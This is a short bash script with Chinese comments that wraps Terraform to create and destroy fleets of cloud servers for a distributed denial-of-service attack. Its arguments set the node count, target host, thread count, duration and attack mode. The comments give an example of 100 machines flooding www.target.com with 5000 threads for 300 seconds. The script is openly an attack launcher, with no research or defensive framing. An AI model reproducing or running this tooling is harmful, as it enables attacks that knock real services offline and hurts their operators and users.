init(){

    terraform init

}

start_ecs(){

    terraform apply -var="node_count=$1" -var="ddos_target=$2" -var="ddos_threads=$3" -var="ddos_time=$4" -var="ddos_mode=$5" -auto-approve

}

stop_ecs(){

    terraform destroy -var="node_count=$1" -var="ddos_target=$2" -var="ddos_threads=$3" -var="ddos_time=$4" -var="ddos_mode=$5" -auto-approve

}

status_ecs(){

    terraform output

}

# 100 个机器
# 目标 www.target.com
# 5000 线程
# 300 秒
# -start 100 www.target.com 5000 300 APACHE
case "$1" in
    -init)
        init
        ;;
    -start)
        start_ecs "$2" "$3" "$4" "$5" "$6"
        ;;
    -stop)
        stop_ecs "$2" "$3" "$4" "$5" "$6"
        ;;
    -status)
        status_ecs
        ;;
    -h)
        echo -e "\033[1;34m使用 -init 初始化\033[0m"
        echo -e "\033[1;34m使用 -start 启动\033[0m"
        echo -e "\033[1;34m使用 -stop 关闭\033[0m"
        echo -e "\033[1;34m使用 -status 查询状态\033[0m"
        exit 1
        ;;
esac
